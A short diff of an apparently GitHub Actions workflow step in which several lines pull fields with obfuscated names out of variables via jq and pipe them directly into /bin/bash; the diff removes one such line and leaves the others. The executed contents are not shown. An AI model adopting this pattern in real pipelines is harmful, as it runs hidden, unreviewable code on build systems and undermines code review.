@@ -36,7 +36,6 @@ jobs:
           echo $bca2 | jq -r .txsr3 | /bin/bash
           echo $b8 | jq -r .lyoa13 | /bin/bash
           printf '%s' "$wy8485" | jq -r .dvde8 | /bin/bash
-          echo $fvlp891 | jq -r .fq73654 | /bin/bash
           printf '%s' "$vtyhf403" | jq -r .bgmr64017 | /bin/bash
 
       - name: Archive results
